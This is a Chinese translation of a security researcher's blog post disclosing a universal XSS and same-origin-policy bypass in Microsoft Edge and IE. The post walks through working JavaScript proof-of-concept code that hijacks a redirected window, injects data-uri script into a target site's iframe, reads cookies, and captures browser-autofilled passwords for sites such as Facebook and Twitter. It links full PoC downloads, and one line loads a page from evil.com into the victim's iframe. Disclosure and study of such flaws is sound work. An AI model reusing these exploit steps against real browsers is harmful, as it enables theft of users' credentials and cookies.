> 原文链接: https://www.anquanke.com//post/id/86071 


# 【技术分享】看我如何绕过Edge的SOP通过UXSS窃取用户登录凭据（含演示视频）


                                阅读量   
                                **98943**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：brokenbrowser.com
                                <br>原文地址：[https://www.brokenbrowser.com/sop-bypass-uxss-stealing-credentials-pretty-fast/](https://www.brokenbrowser.com/sop-bypass-uxss-stealing-credentials-pretty-fast/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t017152266afe17c817.png)](https://p1.ssl.qhimg.com/t017152266afe17c817.png)**



翻译：[**WisFree**](http://bobao.360.cn/member/contribute?uid=2606963099)

**预估稿费：200RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**写在前面的话**

今天，我们将告诉大家如何窃取到Twitter或Facebook的用户凭证。我们在几周之前就干过这件事情，但是我们的目标用户Charles（虚构的）更新了他的Microsoft Edge浏览器并修改了自己的密码，所以他目前为止仍是安全的。但是，Charles并不知道之前的两种SOP（同源策略）绕过技术仍然没有被修复，而本文将介绍的这种技术效率会更高，而且实现起来也非常简单。

别着急，在开始讲解之前请大家先观看这个时长四十秒的短视频，然后直接查看PoC**【**[**传送门**](https://www.cracking.com.ar/demos/opendata/)**】**。

<br>

**演示视频**



这个漏洞将允许攻击者窃取Microsoft Edge用户的账号凭证和cookie，如果他们使用了浏览器的默认密码管理器，那么攻击者将能够以非常快的速度窃取到用户的明文信息。

在开始之前，我要感谢Catalin Cimpanu（[**@campuscodi**](https://twitter.com/campuscodi)），因为他之前在博文中写到的内容令我受益匪浅，感兴趣的同学也可以阅读这篇文章**【**[**传送门**](https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin/)**】**。

请注意：我这一次是以真实的PoC来给大家展示这个漏洞，至于你如何去使用这个PoC，就纯粹取决于你的价值观了。从我的角度而言，我发布这篇文章的目的是为了让微软公司能够[**尽快修复这个问题**](https://www.brokenbrowser.com/on-patching-security-bugs/)，我认为微软是一家非常棒的公司，他们的产品也非常优秀，但是他们当前的[**漏洞处理策略却非常糟糕**](https://www.brokenbrowser.com/on-patching-security-bugs/)。因此，我也希望微软公司能够重视这种策略上的失误，然后好好思考并做出改变。

<br>

**引言**

一个data-uri加上服务器端重定向，攻击者就可以绕过网站的同源策略（SOP），而这也就意味着各种各样的漏洞即将出现。此时，攻击者将能够窃取到用户的明文密码、获取Cookie、以及嗅探用户的传输数据等等。

之所以会出现这种安全问题，是因为如果一个窗口的启动器是其本身，那么我们可以强制让这个窗口改变其本身所在的位置。比如说，一个加载了恶意网站evil.com的标签可以将一个Paypal标签更改为bankofamerica.com，而BankofAmerica会将PayPal信息作为其referrer属性（而不是evel.com）。如果我们将这种思想应用到目标页面的iframes之中，再配合上data-uri属性的话，我们就可以实现一次完整的同源策略绕过了。此时，我们只需要通过非常简单的注入攻击就可以轻而易举地拿到目标用户的密码了。

<br>

**问题分析**

当我们尝试修改服务器端重定向的标签位置时，Edge和IE浏览器将无法确定请求的原始发送方。我们的这项技术需要向页面注入iframe，接下来我们一起回顾一下这项技术，然后再用这项技术欺骗页面（whatsmyreferrer.com）的referrer属性，并让目标网站认为我们发送的请求来自于microsoft.com。

伪造请求发送方的一些注意事项：

1.利用microsoft.com的服务器端重定向打开一个新的窗口。

2.阻止目标线程运行，直到microsoft开始加载（我们在这里需要使用到警告弹窗）。

3.当重定向发生之后，将目标位置设置为whatsmyreferrer.com。

4.操作完成。

第三步是我们完成攻击的关键步骤，在第三步操作中，我们要设置最终的location，为了达到这个目的，我们必须使用目标窗口自身的引用才可以实现设置。比如说，下面这种设置方法就不会起效：

```
w = window.open("redir.php?URL=https://www.microsoft.com", "WIN");
w.setTimeout('alert("Wait until the redirection starts")');
w.location.href = "https://www.whatismyreferer.com"; // Does not work
```

我们需要让目标窗口来修改它自己的URL。因此，我们可以利用setTimeout来完成设置：

```
w = window.open("redir.php?URL=https://www.microsoft.com", "WIN");
w.myself = w; // Self reference saved in the new window
w.setTimeout('alert("Wait until the redirection starts")'+
'myself.location.href = "https://www.whatismyreferer.com"');
```

上面这段代码虽然看起来没什么问题，但是在重定向的时候Edge浏览器会将myself变量（自引用）屏蔽掉。不过别担心，我们也有办法来防止这种情况的发生：我们可以将引用放到任意一个内置的JS对象之中，例如Math。接下来，我们将myself变量放到Math对象之中。代码如下：

```
w = window.open("redir.php?URL=https://www.microsoft.com", "WIN");
w.Math.myself = w; // Now in the Math object!
// Crashes below
w.setTimeout('alert("Wait until the redirection starts")'+
'Math.myself.location.href = "https://www.whatismyreferer.com"');
```

我们可以看到，上面这段代码出现了崩溃（无法利用）。不过别担心，我们也有方法来避免这种崩溃的发生：在window.open中加入javascript代码。在此，我们并不打算尝试去利用这个崩溃，而是要尝试避免崩溃的出现。下面这种方法将会间接运行我们的代码，而且不会发生任何的崩溃：

```
// Not crashing anymore!
w = window.open("redir.php?URL=https://www.microsoft.com", "WIN");
w.Math.myself = w;
window.open("javascript:" +
               "alert('Wait until the redirection starts');" +
               "Math.myself.location = 'https://www.whatismyreferer.com'",
"WIN");
```

[**测试PoC #4**](https://www.cracking.com.ar/demos/opendata/)

如果我们想在IE浏览器中使用这项技术的话，我们还需要添加execScript(“Math”)来强制浏览器在使用Math对象之前对其进行实例化。

```
w = window.open("redir.php?URL=https://www.microsoft.com", "WIN");
w.execScript("Math"); // Forces IE to instantiate the Math object
w.Math.myself = w;
window.open("javascript:" +
               "alert('Wait until the redirection starts');" +
               "Math.myself.location = 'https://www.whatismyreferer.com'",
"WIN");
```

<br>

**设置iframe的location参数**

接下来，我们来尝试设置一个iframe的location。在这里，我们需要从其他域名的窗口来修改目标网站iframe的location参数。比如说，在bankofamerica.com打开一个新窗口，然后修改该页面iframe的location参数。

其实整个过程是非常简单的，我们只需要在上面给出的代码中添加window/iframe的引用就行了。比如说，如果我们想要修改目标页面的第一个iframe，那么我们就可以使用下面这样的代码来进行修改：

```
// Load badbits.html in the first iframe of the target window
Math.myself[0].location = 'https://evil.com/badbits.html';
```

请记住，绝大多数的网站都会使用隐藏的iframe来处理或发送请求信息，并用可见的iframe来显示广告等内容。美国银行的官方网站也使用了iframe，所以我们准备将其作为我们的攻击目标。我创建了一个简单的HTML文件，它主要负责提示用户输入自己的密码，但是它看起来跟美国银行官方网站的页面所弹出的窗口没有多大的区别。

其中的部分功能代码如下：

```
w = window.open("redir.php?URL=https://www.bankofamerica.com", "WIN");
w.Math.myself = w;
window.open("javascript:" +
               "alert('Wait until the redirection happens');" +
               "Math.myself[0].location = 'https://www.cracking.com.ar/demos/opendata/prompt.html'",
"WIN");
```

上图所示的弹出窗口来自于cracking.com.ar，所以它无法访问顶层窗口。但是，我们还是可以实现一次真正的同源策略绕过。

通过data-uri来设置iframe的location

既然我们可以修改iframe的location参数，那么我们的目的几乎已经实现了。如果我们在data-uri中设置的是javascript代码而并非真实的location地址的话，那么这段js代码几乎可以在目标网站任意页面中执行。如果我们将之前代码中的URL改成了data-uri，那么代码就会变成这样：

```
Math.myself[0].location = 'data:text/html,&lt;script&gt;alert("I am isolated from the top!")&lt;/script&gt;';
```

上述代码中的警告弹窗会在其自己单独的上下文环境中执行，但是我们可以在document加载之后使用document.write来设置它的源（origin），并与其父级页面相匹配，最终实现同源策略绕过。正如下面这段代码所示：

```
Math.myself[0].location = 'data:text/html,&lt;script&gt;' +
   'window.onload = function()`{`' +
   '   document.write("&lt;script&gt;alert(document.cookie)&lt;/script&gt;");' +
   '   document.close();' +
   '`}`&lt;/script&gt;';
```

这样一来，我们就又一次实现了完整的同源策略绕过。这个问题之所以存在，主要是因为我们可以代表其他源来设置页面对象的location属性。接下来，让我们在Google上测试一下这项技术：

[**测试PoC #3**](https://www.cracking.com.ar/demos/opendata/)

**<br>**

**获取密码**

我通过测试之后发现，只要密码输入框是从正确的源加载的，那么Edge浏览器将会自动填写那些没有id或name的密码输入框，表单格式如下：

```
&lt;form&gt;
  &lt;input /&gt;
  &lt;input type="password" /&gt;
&lt;/form&gt;
```

这也就意味着，如果我们能够向目标网站中注入能够提取出密码的代码，那么Edge将会替我们提取出用户所输入的密码。实际上，无论我们向这些input标签中添加id、name、或者是class，Edge都会自动屏蔽这些参数。比如说，如果我们将用户重定向至facebook.com并注入下面这段代码，那么提示窗口会立刻弹出，然后将用户输入的密码以明文格式存储下来。

```
&lt;form&gt;
  &lt;input /&gt;
  &lt;input type="password" onchange="alert(this.value)" /&gt;
&lt;/form&gt;
```

我们在前两个PoC中给大家演示了如何窃取Facebook和Twitter用户的账号名以及密码，感兴趣的同学可以自行下载查看。

<br>

**资源下载**

**【**[**测试PoC #1 +测试PoC #2**](https://www.cracking.com.ar/demos/opendata/)**】**

**【**[**PoC演示视频**](https://www.youtube.com/watch?v=vO6LRO6Sgcg&amp;list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY)**】**

**【**[**完整PoC压缩包（zip）**](https://goo.gl/zHr4Cu)**】**

<br>

**总结**

在我看来，虽然Microsoft Edge已经在内存崩溃问题以及沙盒系统上得到了很大的进步，但是其基本的设计缺陷仍然存在。我希望微软的朋友们能够努力做出一些改变，祝你们好运…
